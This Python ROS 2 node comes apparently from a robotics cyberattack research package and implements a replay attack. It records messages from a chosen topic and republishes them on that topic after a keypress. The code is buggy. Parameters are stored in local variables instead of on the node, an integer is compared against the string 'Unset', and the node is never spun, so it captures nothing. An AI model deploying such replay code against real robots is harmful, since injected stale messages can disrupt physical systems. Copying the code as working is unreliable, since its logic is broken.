import rclpy, sys
from rclpy.node import Node, NodeNameNonExistentError
from rclpy import Parameter
from std_srvs.srv import Empty
from rcl_interfaces.srv import GetParameters
from roboticpark_cyberattacks.utils import rslg
from rcl_interfaces.srv import *
from std_msgs.msg import String
import random, socket
from ping3 import ping
import concurrent.futures
import importlib

class replynode(Node):

    replyTopic = None
    messaggesList = []
    replyAmount = 0

    def __init__(self):
        super().__init__("replynode")
        self.declare_parameter('reply_topic', "Unset")
        self.declare_parameter('reply_amount', "Unset")
        replyTopic = self.get_parameter('reply_topic').get_parameter_value().string_value
        replyAmount = int(self.get_parameter('reply_amount').get_parameter_value().string_value)
        
        if self.replyAmount == 'Unset' or self.replyTopic == 'Unset':
            rslg(self,f'No reply_topic or reply_amount passed as parameter')

        self.subscription = self.create_subscription(String,replyTopic,self.save_messagges,10)

    def save_messagges(self, msg):
        self.get_logger().info(f'Mensaje recibido: {msg.data}')
        if not len(self.messaggesList) > self.replyAmount:
            self.messaggesList.append(msg)

    def publishStoredData(self):
        self.publisher_ = self.create_publisher(String, self.replyTopic, 10)
        for i in self.messaggesList:
            self.publisher_.publish(i)
            self.get_logger().info('Publishing: "%s"' % i.data)


def main():
    rclpy.init()
    myreplynode = replynode()


    # We reply when needed
    anything = input('Print anything to start replying the data')
    myreplynode.publishStoredData()

